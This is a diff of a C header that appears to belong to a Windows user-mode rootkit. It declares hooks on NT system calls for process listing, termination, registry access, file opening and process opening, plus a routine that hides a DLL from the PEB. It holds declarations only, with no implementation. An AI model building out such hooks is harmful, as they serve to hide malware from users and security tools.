@@ -108,18 +108,25 @@ typedef NTSTATUS(WINAPI* pNtSetValueKey)(
     ULONG DataSize);
 
 typedef NTSTATUS(WINAPI* pNtDeleteValueKey)(
-  HANDLE KeyHandle,
-  PUNICODE_STRING ValueName);
+    HANDLE KeyHandle,
+    PUNICODE_STRING ValueName);
 
 typedef NTSTATUS(WINAPI* pNtOpenProcess)(
-    PHANDLE ProcessHandle, 
-    ACCESS_MASK DesiredAccess, 
-    POBJECT_ATTRIBUTES ObjectAttributes, 
+    PHANDLE ProcessHandle,
+    ACCESS_MASK DesiredAccess,
+    POBJECT_ATTRIBUTES ObjectAttributes,
     PCLIENT_ID ClientId);
+
+typedef NTSTATUS(WINAPI* pNtQueryInformationProcess)(
+    HANDLE ProcessHandle,
+    PROCESSINFOCLASS ProcessInformationClass,
+    PVOID ProcessInformation,
+    ULONG ProcessInformationLength,
+    PULONG ReturnLength);
 
 mPPEB GetPeb(VOID);
 VOID RemoveEntryList(LIST_ENTRY*);
-BOOL RemoveDllFromPebW(LPCWSTR); 
+BOOL RemoveDllFromPebW(LPCWSTR);
 
 DWORD GetPPID(DWORD);
 int GetProcessName(DWORD, char*, DWORD);
@@ -133,15 +140,17 @@ NTSTATUS WINAPI HookedNtTerminateProcess(HANDLE, UINT);
 NTSTATUS WINAPI HookedNtEnumerateValueKey(HANDLE, ULONG, NT_KEY_VALUE_INFORMATION_CLASS, LPVOID, ULONG, PULONG resultLength);
 NTSTATUS WINAPI HookedNtQueryValueKey(HANDLE, PUNICODE_STRING, NT_KEY_VALUE_INFORMATION_CLASS, PVOID, ULONG, PULONG);
 NTSTATUS WINAPI HookedNtOpenFile(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PIO_STATUS_BLOCK, ULONG, ULONG);
-// NTSTATUS WINAPI HookedNtSetValueKey(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG);
+NTSTATUS WINAPI HookedNtSetValueKey(HANDLE, PUNICODE_STRING, ULONG, ULONG, PVOID, ULONG);
 NTSTATUS WINAPI HookedNtDeleteValueKey(HANDLE, PUNICODE_STRING);
 NTSTATUS WINAPI HookedNtOpenProcess(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PCLIENT_ID);
+// NTSTATUS WINAPI HookedNtQueryInformationProcess(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
 
 extern pNtQuerySystemInformation OriginalNtQuerySystemInformation;
 extern pNtTerminateProcess OriginalNtTerminateProcess;
 extern pNtEnumerateValueKey OriginalNtEnumerateValueKey;
 extern pNtQueryValueKey OriginalNtQueryValueKey;
 extern pNtOpenFile OriginalNtOpenFile;
-// extern pNtSetValueKey OriginalNtSetValueKey;
+extern pNtSetValueKey OriginalNtSetValueKey;
 extern pNtDeleteValueKey OriginalNtDeleteValueKey;
 extern pNtOpenProcess OriginalNtOpenProcess;
+// extern pNtQueryInformationProcess OriginalNtQueryInformationProcess;
